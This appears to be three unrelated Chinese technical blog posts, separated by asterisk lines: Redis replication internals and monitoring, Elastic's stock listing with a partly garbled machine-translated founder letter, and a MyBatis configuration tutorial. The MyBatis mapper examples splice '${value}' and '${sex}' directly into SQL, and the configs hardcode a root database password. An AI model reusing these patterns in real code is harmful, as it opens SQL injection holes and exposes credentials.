19746:S 05 Oct 20:42:06.752 * Connecting to MASTER 127.0.0.1:6379
19746:S 05 Oct 20:42:06.752 * MASTER <-> SLAVE sync started
19746:S 05 Oct 20:42:06.752 * Non blocking connect for SYNC fired the event.
19746:S 05 Oct 20:42:06.753 * Master replied to PING, replication can continue...
19746:S 05 Oct 20:42:06.753 * Trying a partial resynchronization (request f8a035fdbb7cfe435652b3445c2141f98a65e437:1037).
19746:S 05 Oct 20:42:06.753 * Successful partial resynchronization with master.
19746:S 05 Oct 20:42:06.753 * MASTER <-> SLAVE sync: Master accepted a Partial Resynchronization.

 
在Redis 4.0中，master_replid和offset存储在RDB文件中。当从节点被优雅的关闭并重新启动时，Redis能够从RDB文件中重新加载master_replid和offset，从而使增量同步成为可能。
 
增量同步的实现依赖于以下三部分：
1. 主从节点的复制偏移量。
2. 主节点的复制积压缓冲区。
3. 节点的运行ID（run ID）。
 
当一个从节点被提升为主节点时，其它的从节点必须与新主节点重新同步。在Redis 4.0 之前，因为master_replid发生了变化，所以这个过程是一个全量同步。在Redis 4.0之后，新主节点会记录旧主节点的naster_replid和offset，因为能够接受来自其它从节点的增量同步请求，即使请求中的master_replid不同。在底层实现上，当执行slaveof no one时，会将master_replid，master_repl_offset+1复制为master_replid，second_repl_offset。
 
复制相关变量

# Replication
role:master
connected_slaves:2
slave0:ip=127.0.0.1,port=6380,state=online,offset=5698,lag=0
slave1:ip=127.0.0.1,port=6381,state=online,offset=5698,lag=0
master_replid:e071f49c8d9d6719d88c56fa632435fba83e145d
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:5698
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:5698

# Replication
role:slave
master_host:127.0.0.1
master_port:6379
master_link_status:up
master_last_io_seconds_ago:1
master_sync_in_progress:0
slave_repl_offset:126
slave_priority:100
slave_read_only:1
connected_slaves:0
master_replid:15715bc0bd37a71cae3d08b9566f001ccbc739de
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:126
second_repl_offset:-1
repl_backlog_active:1
repl_backlog_size:1048576
repl_backlog_first_byte_offset:1
repl_backlog_histlen:126

 
其中，
role: Value is "master" if the instance is replica of no one, or "slave" if the instance is a replica of some master instance. Note that a replica can be master of another replica (chained replication).
master_replid: The replication ID of the Redis server. 每个Redis节点启动后都会动态分配一个40位的十六进制字符串作为运行ID。主的运行ID。
master_replid2: The secondary replication ID, used for PSYNC after a failover. 在执行slaveof no one时，会将master_replid，master_repl_offset+1复制为master_replid，second_repl_offset。
master_repl_offset: The server's current replication offset.  Master的复制偏移量。
second_repl_offset: The offset up to which replication IDs are accepted.
repl_backlog_active: Flag indicating replication backlog is active 是否开启了backlog。
repl_backlog_size: Total size in bytes of the replication backlog buffer. repl-backlog-size的大小。
repl_backlog_first_byte_offset: The master offset of the replication backlog buffer. backlog中保存的Master最早的偏移量，
repl_backlog_histlen: Size in bytes of the data in the replication backlog buffer. backlog中数据的大小。
If the instance is a replica, these additional fields are provided:
master_host: Host or IP address of the master. Master的IP。
master_port: Master listening TCP port. Master的端口。
master_link_status: Status of the link (up/down). 主从之间的连接状态。
master_last_io_seconds_ago: Number of seconds since the last interaction with master.  主节点每隔10s对从从节点发送PING命令，以判断从节点的存活性和连接状态。该变量代表多久之前，主从进行了心跳交互。
master_sync_in_progress: Indicate the master is syncing to the replica. 主节点是否在向从节点同步数据。个人觉得，应该指的是全量同步或增量同步。
slave_repl_offset: The replication offset of the replica instance. Slave的复制偏移量。
slave_priority: The priority of the instance as a candidate for failover. Slave的权重。
slave_read_only: Flag indicating if the replica is read-only. Slave是否处于可读模式。
If a SYNC operation is on-going, these additional fields are provided:
master_sync_left_bytes: Number of bytes left before syncing is complete. 
master_sync_last_io_seconds_ago: Number of seconds since last transfer I/O during a SYNC operation. 
If the link between master and replica is down, an additional field is provided:
master_link_down_since_seconds: Number of seconds since the link is down. 主从连接中断持续的时间。
 
The following field is always provided:
connected_slaves: Number of connected replicas. 连接的Slave的数量。
 
If the server is configured with the min-slaves-to-write (or starting with Redis 5 with the min-replicas-to-write) directive, an additional field is provided:
min_slaves_good_slaves: Number of replicas currently considered good。状态正常的从节点的数量。
 
For each replica, the following line is added:slaveXXX: id, IP address, port, state, offset, lag. Slave的状态。

slave0:ip=127.0.0.1,port=6381,state=online,offset=1288,lag=1

 
如何监控主从延迟

# Replication
role:master
connected_slaves:2
slave0:ip=127.0.0.1,port=6381,state=online,offset=560,lag=0
slave1:ip=127.0.0.1,port=6380,state=online,offset=560,lag=0
master_replid:15715bc0bd37a71cae3d08b9566f001ccbc739de
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:560

其中，master_repl_offset是主节点的复制偏移量，slaveX中的offset即对应从节点的复制偏移量，两者的差值即主从的延迟量。
 
如何评估backlog缓冲区的大小
t * (master_repl_offset2 - master_repl_offset1 ) / (t2 - t1)
t is how long the disconnections may last in seconds.
 
参考：
1. 《Redis开发与运维》
2. 《Redis设计与实现》
3. 《Redis 4.X Cookbook》
********************************************************************************************************************************************************************************************************
Elastic 今日在纽交所上市，股价最高暴涨122%。
10 月 6 日，Elastic 正式在纽约证券交易所上市，股票代码为"ESTC"。开盘之后股价直线拉升，最高点涨幅达122%，截止到收盘涨幅回落到94%，意味着上市第一天估值接近翻倍。

该公司最初位于阿姆斯特丹，而后搬迁到加利福尼亚，其股价定价为 33 至 35 美元，高于最初的每股 26 美元至 29 美元的价格指数。 700 万普通股募集资金约 1.92 亿美元，上市首日收盘价 70 美元。Elastic 公司拥有期权的程序员们估计今天又是一个不眠夜。
Elastic 成立于 2012 年，最著名的产品是搜索引擎 Elasticsearch ，该搜索引擎以与 Google LLC 索引互联网类似的方式为企业用户索引内部数据。使用该产品的知名公司包括：思科、eBay、高盛、美国国家宇航局、微软、维基媒体基金会、三星电子和韦里逊等，下载量超过 1 亿人次。
Elastic 是一家搜索公司。作为 Elastic Stack（Elasticsearch，Kibana，Beats和Logstash）的创建者，Elastic 构建了自我管理和 SaaS 产品，使数据可以实时和大规模地用于搜索、日志记录、安全和分析用例。该产品普遍应用在各大互联网行业，从最初的日志监控工具发展成为一个全方面的监控平台。
值得注意的是，Elastic 的核心产品是开源的。该公司通过商业版本赚钱，其中包括企业的高级功能，以及去年增加的机器学习功能，可以发现实时数据流中的异常情况。
作为公司最重量级的产品 Elasticsearch，它的诞生其实有着一段故事：

多年前，一个叫做 Shay Banon 的刚结婚不久的失业开发者，由于妻子要去伦敦学习厨师，他便跟着也去了。在他找工作的过程中，为了给妻子构建一个食谱的搜索引擎，他开始构建一个早期版本的 Lucene。
直接基于 Lucene 工作会比较困难，所以 Shay 开始抽象 Lucene 代码以便 Java 程序员可以在应用中添加搜索功能。他发布了他的第一个开源项目，叫做“ Compass”。
后来 Shay 找到一份工作，这份工作处在高性能和内存数据网格的分布式环境中，因此高性能的、实时的、分布式的搜索引擎也是理所当然需要的。然后他决定重写 Compass 库使其成为一个独立的服务叫做 Elasticsearch。
第一个公开版本出现在 2010 年 2 月，在那之后 Elasticsearch 已经成为 Github上最受欢迎的项目之一，代码贡献者超过300人。一家主营 Elasticsearch 的公司就此成立，他们一边提供商业支持一边开发新功能，不过 Elasticsearch 将永远开源且对所有人可用。
Shay 的妻子依旧等待着她的食谱搜索……

每次看到这个故事我都要笑一笑，那么 Elasticsearch 到底是什么呢？简单介绍一下：
Elasticsearch 是一个基于 Apache Lucene(TM) 的开源搜索引擎。无论在开源还是专有领域，Lucene 可以被认为是迄今为止最先进、性能最好的、功能最全的搜索引擎库。
但是，Lucene 只是一个库。想要使用它，你必须使用 Java 来作为开发语言并将其直接集成到你的应用中，更糟糕的是，Lucene 非常复杂，你需要深入了解检索的相关知识来理解它是如何工作的。
Elasticsearch 也使用 Java 开发并使用 Lucene 作为其核心来实现所有索引和搜索的功能，但是它的目的是通过简单的 RESTful API 来隐藏 Lucene 的复杂性，从而让全文搜索变得简单。
不过，Elasticsearch 不仅仅是 Lucene 和全文搜索，我们还能这样去描述它：

分布式的实时文件存储，每个字段都被索引并可被搜索
分布式的实时分析搜索引擎
可以扩展到上百台服务器，处理PB级结构化或非结构化数据

而且，所有的这些功能被集成到一个服务里面，你的应用可以通过简单的 RESTful API、各种语言的客户端甚至命令行与之交互。
上手 Elasticsearch 非常容易，它提供了许多合理的缺省值，并对初学者隐藏了复杂的搜索引擎理论。它开箱即用（安装即可使用），只需很少的学习既可在生产环境中使用。
用一句话来总结就是：Elasticsearch 是一个实时分布式搜索和分析引擎，可以应用在任何实时检索的场景中。
Elastic 上市对程序员意味着什么？
对照上面的故事我们发现，Elasticsearch 最早只是一个解决垂直领域的一个小工具，随着时间的推移这个小工具慢慢的发展成为一个开源项目；当这个开源项目使用越来越广的时候，创建者将其发展成为一个产品；依赖于此产品成为了一个公司，随着公司的不断发展依赖此产品不断扩充它的产品线和应用场景，同时推出商业版本的解决方案；最后公司不断发展、融资、壮大，直到现在公司上市。
公司成长路线图：

小工具 > 开源项目 > 成熟产品 > 成立公司 > 商业版本 > 产品线扩充 > 融资发展 > 公司上市

可以说上面的成长路线是每一个程序员都所期望的逆袭经历，真正的通过某一个技术不断的发展、成熟、成立公司、最后上市，其产品影响千万个企业，用技术造福了整个行业，并且自己也成功逆袭走上人生巅峰。
Elastic 公司上市给很多自由职业或者追求技术创业的朋友一个大大的鼓舞。中国已经有很多类似的初创企业，比如开源产品 TiDB 的公司 PingCAP 已经获得多轮投资，公司发展非常迅速。所以说：技术创业可行，并且前景广阔。

最后附 Elastic search 官网回顾自己的过往并展望未来：

你们好,
今天我们将以一家上市公司的名义踏上旅程。 我很自豪地宣布，Elastic search 在纽约证券交易所上市，股票代码为“ESTC。”
2010年2月8日，当我第一次发布 Elasticsearch 的时候，我有一个看法，搜索不仅仅是一个搜索框在一个网站上。那时，公司开始存储更多的数据，包括结构化的和非结构化的，以及来自许多不同数据源的数据，例如数据库、网站、应用程序以及移动和连接设备。在我看来，搜索将为用户提供一种与他们的数据交互的新类型，包括，速度，实时获得结果的能力；规模，以毫秒查询千兆字节数据的能力；相关性，获得准确和可操作的信息、见解和 answe 的能力。来自数据的 RS。
我为我这六年来在 Elasticsearch 的营造而感到自豪。 有超过3.5亿的产品下载，一个聚会的100000多名开发人员社区，和超过5500名客户，看到搜索如何应用于这样的各种各样的用例，真是让人不寒而栗。例如，当您使用 Uber、Instacart 和 Tinder 时，它是弹性的，它使骑手与附近的司机配对，为在线购物者提供相关的结果和建议，或者匹配他们可能喜欢的人——以及谁可能喜欢他们回来。另一方面，在传统的IT、运营和安全部门中，像思科、斯普林特和印第安纳大学这样的组织，使用Elastic来聚合定价、报价和商业数据，每天处理数十亿日志事件，以监控网站性能和网络中断，并为数千个设备和关键数据提供网络安全操作。虽然这些用例中的每一个都不同，但都是搜索。
作为一家上市公司，我们将继续做那些使我们富有弹性的事情。我们将继续在全世界的开发者社区投资，这是我们的DNA。我们将继续为Elastic Stack 建立新的特征和解决方案。我们将始终允许用户和他们的组织部署我们的产品，无论它最适合他们的地方——现场、公共云或使用我们的弹性云。最后，我们将永远遵守我们的源代码，雇佣谦虚、积极、平衡的优秀人员来帮助我们的用户、客户和合作伙伴获得成功。
谢谢每一个让今天成为可能的人。
谢

参考
Elasticsearch权威指南

********************************************************************************************************************************************************************************************************
MyBatis学习总结（二）——MyBatis核心配置文件与输入输出映射
在上一章中我们学习了《MyBatis学习总结（一）——ORM概要与MyBatis快速起步》，这一章主要是介绍MyBatis核心配置文件、使用接口+XML实现完整数据访问、输入参数映射与输出结果映射等内容。
一、MyBatis配置文件概要
MyBatis核心配置文件在初始化时会被引用，在配置文件中定义了一些参数，当然可以完全不需要配置文件，全部通过编码实现，该配置文件主要是是起到解偶的作用。如第一讲中我们用到conf.xml文件：

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE configuration
        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-config.dtd">
<configuration>
    <environments default="development">
        <environment id="development">
            <transactionManager type="JDBC"/>
            <dataSource type="POOLED">
                <property name="driver" value="com.mysql.jdbc.Driver"/>
                <property name="url" value="jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&amp;characterEncoding=UTF-8"/>
                <property name="username" value="root"/>
                <property name="password" value="uchr@123"/>
            </dataSource>
        </environment>
    </environments>
    <mappers>
        <!--<mapper resource="mapper/studentMapper.xml"/>-->
        <mapper class="com.zhangguo.mybatis02.dao.StudentMapper"></mapper>
    </mappers>
</configuration>

MyBatis 的配置文件包含了会深深影响 MyBatis 行为的设置（settings）和属性（properties）信息。文档的顶层结构如下：：

configuration 配置

properties 属性
settings 设置
typeAliases 类型别名
typeHandlers 类型处理器
objectFactory 对象工厂
plugins 插件
environments 环境

environment 环境变量

transactionManager 事务管理器
dataSource 数据源




databaseIdProvider 数据库厂商标识
mappers 映射器



二、MyBatis配置文件详解
该配置文件的官方详细描述可以点击这里打开。
2.1、properties属性
作用：将数据连接单独配置在db.properties中，只需要在myBatisConfig.xml中加载db.properties的属性值，在myBatisConfig.xml中就不需要对数据库连接参数进行硬编码。数据库连接参数只配置在db.properties中，方便对参数进行统一管理，其它xml可以引用该db.properties。
db.properties的内容：

##MySQL连接字符串
#驱动
mysql.driver=com.mysql.jdbc.Driver
#地址
mysql.url=jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&amp;characterEncoding=UTF-8
#用户名
mysql.username=root
#密码
mysql.password=uchr@123

在myBatisConfig.xml中加载db.properties

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE configuration
        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-config.dtd">
<configuration>
    <!--导入db.properties文件中的所有key-value数据-->
    <properties resource="db.properties">
        <!--定义一个名称为driver，值为com.mysql.jdbc.Driver的属性-->
        <property name="driver" value="com.mysql.jdbc.Driver"></property>
    </properties>
    <!--环境配置，default为默认选择的环境-->
    <environments default="work">
        <!--开发-->
        <environment id="development">
            <!--事务管理-->
            <transactionManager type="JDBC"/>
            <!--连接池-->
            <dataSource type="POOLED">
                <!--引用属性${mysql.driver}-->
                <property name="driver" value="${mysql.driver}"/>
                <property name="url" value="${mysql.url}"/>
                <property name="username" value="${mysql.username}"/>
                <property name="password" value="${mysql.password}"/>
            </dataSource>
        </environment>
        <!--运行-->
        <environment id="work">
            <transactionManager type="JDBC"/>
            <dataSource type="POOLED">
                <property name="driver" value="${driver}"/>
                <property name="url" value="jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&amp;characterEncoding=UTF-8"/>
                <property name="username" value="root"/>
                <property name="password" value="uchr@123"/>
            </dataSource>
        </environment>
    </environments>
    <mappers>
        <!--<mapper resource="mapper/studentMapper.xml"/>-->
        <mapper class="com.zhangguo.mybatis02.dao.StudentMapper"></mapper>
    </mappers>
</configuration>

properties特性：
注意：

在properties元素体内定义的属性优先读取。
然后读取properties元素中resource或url加载的属性，它会覆盖已读取的同名属性。
最后读取parameterType传递的属性，它会覆盖已读取的同名属性

建议：
　　不要在properties元素体内添加任何属性值，只将属性值定义在properties文件中。
　　在properties文件中定义属性名要有一定的特殊性，如xxxx.xxxx(jdbc.driver)
2.2、settings全局参数配置
mybatis框架运行时可以调整一些运行参数。比如，开启二级缓存，开启延迟加载等等。全局参数会影响mybatis的运行行为。
mybatis-settings的配置属性以及描述



setting(设置)
Description(描述)
valid　Values(验证值组)
Default(默认值)


cacheEnabled
在全局范围内启用或禁用缓存配置 任何映射器在此配置下。
true | false
TRUE


lazyLoadingEnabled
在全局范围内启用或禁用延迟加载。禁用时，所有相关联的将热加载。
true | false
TRUE


aggressiveLazyLoading
启用时，有延迟加载属性的对象将被完全加载后调用懒惰的任何属性。否则，每一个属性是按需加载。
true | false
TRUE


multipleResultSetsEnabled
允许或不允许从一个单独的语句（需要兼容的驱动程序）要返回多个结果集。
true | false
TRUE


useColumnLabel
使用列标签，而不是列名。在这方面，不同的驱动有不同的行为。参考驱动文档或测试两种方法来决定你的驱动程序的行为如何。
true | false
TRUE


useGeneratedKeys
允许JDBC支持生成的密钥。兼容的驱动程序是必需的。此设置强制生成的键被使用，如果设置为true，一些驱动会不兼容性，但仍然可以工作。
true | false
FALSE


autoMappingBehavior
指定MyBatis的应如何自动映射列到字段/属性。NONE自动映射。 PARTIAL只会自动映射结果没有嵌套结果映射定义里面。 FULL会自动映射的结果映射任何复杂的（包含嵌套或其他）。

NONE,PARTIAL,FULL

PARTIAL


defaultExecutorType
配置默认执行人。SIMPLE执行人确实没有什么特别的。 REUSE执行器重用准备好的语句。 BATCH执行器重用语句和批处理更新。

SIMPLE,REUSE,BATCH

SIMPLE


safeRowBoundsEnabled
允许使用嵌套的语句RowBounds。
true | false
FALSE


mapUnderscoreToCamelCase
从经典的数据库列名A_COLUMN启用自动映射到骆驼标识的经典的Java属性名aColumn。
true | false
FALSE


localCacheScope
MyBatis的使用本地缓存，以防止循环引用，并加快反复嵌套查询。默认情况下（SESSION）会话期间执行的所有查询缓存。如果localCacheScope=STATMENT本地会话将被用于语句的执行，只是没有将数据共享之间的两个不同的调用相同的SqlSession。

SESSION
STATEMENT

SESSION


dbcTypeForNull
指定为空值时，没有特定的JDBC类型的参数的JDBC类型。有些驱动需要指定列的JDBC类型，但其他像NULL，VARCHAR或OTHER的工作与通用值。
JdbcType enumeration. Most common are: NULL, VARCHAR and OTHER
OTHER


lazyLoadTriggerMethods
指定触发延迟加载的对象的方法。
A method name list separated by commas
equals,clone,hashCode,toString


defaultScriptingLanguage
指定所使用的语言默认为动态SQL生成。
A type alias or fully qualified class name.

org.apache.ibatis.scripting.xmltags
.XMLDynamicLanguageDriver



callSettersOnNulls
指定如果setter方法或map的put方法时，将调用检索到的值是null。它是有用的，当你依靠Map.keySet（）或null初始化。注意（如整型，布尔等）不会被设置为null。
true | false
FALSE


logPrefix
指定的前缀字串，MyBatis将会增加记录器的名称。
Any String
Not set


logImpl
指定MyBatis的日志实现使用。如果此设置是不存在的记录的实施将自动查找。
SLF4J | LOG4J | LOG4J2 | JDK_LOGGING | COMMONS_LOGGING | STDOUT_LOGGING | NO_LOGGING
Not set


proxyFactory
指定代理工具，MyBatis将会使用创建懒加载能力的对象。
CGLIB | JAVASSIST
 CGLIB



官方文档settings的例子：


<setting name="cacheEnabled" value="true"/>
    <setting name="lazyLoadingEnabled" value="true"/>
    <setting name="multipleResultSetsEnabled" value="true"/>
    <setting name="useColumnLabel" value="true"/>
    <setting name="useGeneratedKeys" value="false"/>
    <setting name="autoMappingBehavior" value="PARTIAL"/>
    <setting name="defaultExecutorType" value="SIMPLE"/>
    <setting name="defaultStatementTimeout" value="25"/>
    <setting name="safeRowBoundsEnabled" value="false"/>
    <setting name="mapUnderscoreToCamelCase" value="false"/>
    <setting name="localCacheScope" value="SESSION"/>
    <setting name="jdbcTypeForNull" value="OTHER"/>
    <setting name="lazyLoadTriggerMethods" value="equals,clone,hashCode,toString"/>
</settings>

View Code
示例：
这里设置MyBatis的日志输出到控制台：

    <!--外部引入的内容将覆盖内部定义的-->
    <properties resource="db.properties">
        <!--定义一个名称为driver，值为com.mysql.jdbc.Driver的属性-->
        <property name="mysql.driver" value="com.mysql.jdbc.Driver"></property>
    </properties>
    
    <settings>
        <!--设置是否允许缓存-->
        <setting name="cacheEnabled" value="true"/>
        <!--设置日志输出的目标-->
        <setting name="logImpl" value="STDOUT_LOGGING"/>
    </settings>

结果：

2.3、typeAiases(别名)
在mapper.xml中，定义很多的statement，statement需要parameterType指定输入参数的类型、需要resultType指定输出结果的映射类型。
如果在指定类型时输入类型全路径，不方便进行开发，可以针对parameterType或resultType指定的类型定义一些别名，在mapper.xml中通过别名定义，方便开发。
如下所示类型com.zhangguo.mybatis02.entities.Student会反复出现，冗余：
 

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.zhangguo.mybatis02.mapper.studentMapper">
    <select id="selectStudentById" resultType="com.zhangguo.mybatis02.entities.Student">
        SELECT id,name,sex from student where id=#{id}
    </select>

    <select id="selectStudentsByName" parameterType="String" resultType="com.zhangguo.mybatis02.entities.Student">
      SELECT id,name,sex from student where name like '%${value}%';
    </select>

    <insert id="insertStudent" parameterType="com.zhangguo.mybatis02.entities.Student">
        insert into student(name,sex) VALUES(#{name},'${sex}')
    </insert>

    <update id="updateStudent" parameterType="com.zhangguo.mybatis02.entities.Student">
        update student set name=#{name},sex=#{sex} where id=#{id}
    </update>

    <delete id="deleteStudent" parameterType="int">
        delete from student where id=#{id}
    </delete>

</mapper>

2.3.1.MyBatis默认支持的别名




别名


映射的类型




_byte 


byte 




_long 


long 




_short 


short 




_int 


int 




_integer 


int 




_double 


double 




_float 


float 




_boolean 


boolean 




string 


String 




byte 


Byte 




long 


Long 




short 


Short 




int 


Integer 




integer 


Integer 




double 


Double 




float 


Float 




boolean 


Boolean 




date 


Date 




decimal 


BigDecimal 




bigdecimal 


BigDecimal 




2.3.2.自定义别名
（一）、单个别名定义(在myBatisConfig.xml)　　

    <settings>
        <!--设置是否允许缓存-->
        <setting name="cacheEnabled" value="true"/>
        <!--设置日志输出的目标-->
        <setting name="logImpl" value="STDOUT_LOGGING"/>
    </settings>

    <!--别名-->
    <typeAliases>
        <!--定义单个别名，指定名称为student，对应的类型为com.zhangguo.mybatis02.entities.Student-->
        <typeAlias type="com.zhangguo.mybatis02.entities.Student" alias="student"></typeAlias>
    </typeAliases>

UserMapper.xml引用别名

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
<mapper namespace="com.zhangguo.mybatis02.mapper.studentMapper">
    <select id="selectStudentById" resultType="student">
        SELECT id,name,sex from student where id=#{id}
    </select>

    <select id="selectStudentsByName" parameterType="String" resultType="student">
      SELECT id,name,sex from student where name like '%${value}%';
    </select>

    <insert id="insertStudent" parameterType="student">
        insert into student(name,sex) VALUES(#{name},'${sex}')
    </insert>

    <update id="updateStudent" parameterType="student">
        update student set name=#{name},sex=#{sex} where id=#{id}
    </update>

    <delete id="deleteStudent" parameterType="int">
        delete from student where id=#{id}
    </delete>

</mapper>

（二）批量定义别名，扫描指定的包
定义单个别名的缺点很明显，如果项目中有很多别名则需要一个一个定义，且修改类型了还要修改配置文件非常麻烦，可以指定一个包，将下面所有的类都按照一定的规则定义成别名：
 

    <settings>
        <!--设置是否允许缓存-->
        <setting name="cacheEnabled" value="true"/>
        <!--设置日志输出的目标-->
        <setting name="logImpl" value="STDOUT_LOGGING"/>
    </settings>

    <!--别名-->
    <typeAliases>
        <!--定义单个别名，指定名称为student，对应的类型为com.zhangguo.mybatis02.entities.Student-->
        <!--<typeAlias type="com.zhangguo.mybatis02.entities.Student" alias="student"></typeAlias>-->
        <!--指定包名下所有的类被自动扫描并定义默认别名，
        mybatis会自动扫描包中的pojo类，自动定义别名，别名就是类名(首字母大写或小写都可以)-->
        <package name="com.zhangguo.mybatis02.entities"></package>
    </typeAliases>

 如果com.zhangguo.mybatis02.entities包下有一个名为Student的类，则使用别名时可以是：student，或Student。
你一定会想到当两个名称相同时的冲突问题，可以使用注解解决

解决方法：

2.4、typeHandlers(类型处理器)
mybatis中通过typeHandlers完成jdbc类型和java类型的转换。
通常情况下，mybatis提供的类型处理器满足日常需要，不需要自定义.
mybatis支持类型处理器：




类型处理器


Java类型


JDBC类型




BooleanTypeHandler 


Boolean，boolean 


任何兼容的布尔值




ByteTypeHandler 


Byte，byte 


任何兼容的数字或字节类型




ShortTypeHandler 


Short，short 


任何兼容的数字或短整型




IntegerTypeHandler 


Integer，int 


任何兼容的数字和整型




LongTypeHandler 


Long，long 


任何兼容的数字或长整型




FloatTypeHandler 


Float，float 


任何兼容的数字或单精度浮点型




DoubleTypeHandler 


Double，double 


任何兼容的数字或双精度浮点型




BigDecimalTypeHandler 


BigDecimal 


任何兼容的数字或十进制小数类型




StringTypeHandler 


String 


CHAR和VARCHAR类型




ClobTypeHandler 


String 


CLOB和LONGVARCHAR类型




NStringTypeHandler 


String 


NVARCHAR和NCHAR类型




NClobTypeHandler 


String 


NCLOB类型




ByteArrayTypeHandler 


byte[] 


任何兼容的字节流类型




BlobTypeHandler 


byte[] 


BLOB和LONGVARBINARY类型




DateTypeHandler 


Date（java.util）


TIMESTAMP类型




DateOnlyTypeHandler 


Date（java.util）


DATE类型




TimeOnlyTypeHandler 


Date（java.util）


TIME类型




SqlTimestampTypeHandler 


Timestamp（java.sql）


TIMESTAMP类型




SqlDateTypeHandler 


Date（java.sql）


DATE类型




SqlTimeTypeHandler 


Time（java.sql）


TIME类型




ObjectTypeHandler 


任意


其他或未指定类型




EnumTypeHandler 


Enumeration类型


VARCHAR-任何兼容的字符串类型，作为代码存储（而不是索引）。





2.5、mappers(映射配置)
映射配置可以有多种方式，如下XML配置所示：

<!-- 将sql映射注册到全局配置中-->
    <mappers>

        <!--
            mapper 单个注册（mapper如果多的话，不太可能用这种方式）
                resource：引用类路径下的文件
                url：引用磁盘路径下的资源
                class，引用接口
            package 批量注册（基本上使用这种方式）
                name：mapper接口与mapper.xml所在的包名
        -->

        <!-- 第一种：注册sql映射文件-->
        <mapper resource="com/zhangguo/mapper/UserMapper.xml" />

        <!-- 第二种：注册接口sql映射文件必须与接口同名，并且放在同一目录下-->
        <mapper class="com.zhangguo.mapper.UserMapper" />

        <!-- 第三种：注册基于注解的接口  基于注解   没有sql映射文件，所有的sql都是利用注解写在接口上-->
        <mapper class="com.zhangguo.mapper.TeacherMapper" />

        <!-- 第四种：批量注册  需要将sql配置文件和接口放到同一目录下-->
        <package name="com.zhangguo.mapper" />

    </mappers>

2.5.1、通过resource加载单个映射文件

    <mappers>
        <!--根据路径注册一个基于XML的映射器-->
        <mapper resource="mapper/studentMapper.xml"/>
    </mappers>

注意位置

2.5.2:通过mapper接口加载单个映射文件

    <!-- 通过mapper接口加载单个映射配置文件
            遵循一定的规范：需要将mapper接口类名和mapper.xml映射文件名称保持一致，且在一个目录中；
            上边规范的前提是：使用的是mapper代理方法;
      -->
         <mapper class="com.mybatis.mapper.UserMapper"/> 

按照上边的规范，将mapper.java和mapper.xml放在一个目录 ，且同名。

注意：
对于Maven项目，IntelliJ IDEA默认是不处理src/main/java中的非java文件的，不专门在pom.xml中配置<resources>是会报错的，参考处理办法：

<resources>
            <resource>
                <directory>src/main/java</directory>
                <includes>
                    <include>**/*.properties</include>
                    <include>**/*.xml</include>
                </includes>
                <filtering>true</filtering>
            </resource>
            <resource>
                <directory>src/main/resources</directory>
                <includes>
                    <include>**/*.properties</include>
                    <include>**/*.xml</include>
                </includes>
                <filtering>true</filtering>
            </resource>
</resources>

所以src/main/java中最好不要出现非java文件。实际上，将mapper.xml放在src/main/resources中比较合适。
2.5.3、批量加载mapper

<!-- 批量加载映射配置文件,mybatis自动扫描包下面的mapper接口进行加载
     遵循一定的规范：需要将mapper接口类名和mapper.xml映射文件名称保持一致，且在一个目录中；
     上边规范的前提是：使用的是mapper代理方法;
      -->
<package name="com.mybatis.mapper"/> 

最后的配置文件：


<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE configuration
        PUBLIC "-//mybatis.org//DTD Config 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-config.dtd">
<configuration>
    <!--导入db.properties文件中的所有key-value数据-->
    <!--外部引入的内容将覆盖内部定义的-->
    <properties resource="db.properties">
        <!--定义一个名称为driver，值为com.mysql.jdbc.Driver的属性-->
        <property name="mysql.driver" value="com.mysql.jdbc.Driver"></property>
    </properties>
    
    <settings>
        <!--设置是否允许缓存-->
        <setting name="cacheEnabled" value="true"/>
        <!--设置日志输出的目标-->
        <setting name="logImpl" value="STDOUT_LOGGING"/>
    </settings>

    <!--别名-->
    <typeAliases>
        <!--定义单个别名，指定名称为student，对应的类型为com.zhangguo.mybatis02.entities.Student-->
        <!--<typeAlias type="com.zhangguo.mybatis02.entities.Student" alias="student"></typeAlias>-->
        <!--指定包名下所有的类被自动扫描并定义默认别名，
        mybatis会自动扫描包中的pojo类，自动定义别名，别名就是类名(首字母大写或小写都可以)-->
        <package name="com.zhangguo.mybatis02.entities"></package>
    </typeAliases>

    <!--注册自定义的类型处理器-->
    <typeHandlers>
        <!--<typeHandler handler="" javaType="" jdbcType=""></typeHandler>-->
    </typeHandlers>
    
    <!--环境配置，default为默认选择的环境-->
    <environments default="development">
        <!--开发-->
        <environment id="development">
            <!--事务管理-->
            <transactionManager type="JDBC"/>
            <!--连接池-->
            <dataSource type="POOLED">
                <!--引用属性${mysql.driver}-->
                <property name="driver" value="${mysql.driver}"/>
                <property name="url" value="${mysql.url}"/>
                <property name="username" value="${mysql.username}"/>
                <property name="password" value="${mysql.password}"/>
            </dataSource>
        </environment>
        <!--运行-->
        <environment id="work">
            <transactionManager type="JDBC"/>
            <dataSource type="POOLED">
                <property name="driver" value="${driver}"/>
                <property name="url" value="jdbc:mysql://127.0.0.1:3306/nfmall?useUnicode=true&amp;characterEncoding=UTF-8"/>
                <property name="username" value="root"/>
                <property name="password" value="uchr@123"/>
            </dataSource>
        </environment>
    </environments>

    <mappers>
        <!--根据路径注册一个基于XML的映射器-->
        <mapper resource="mapper/studentMapper.xml"/>
        <!--根据类型注册一个基于注解的映射器，接口-->
        <mapper class="com.zhangguo.mybatis02.dao.StudentMapper"></mapper>
        <!--根据包名批量注册包下所有基于注解的映射器-->
        <package name="com.zhangguo.mybatis02.dao"></package>
    </mappers>

</configuration>

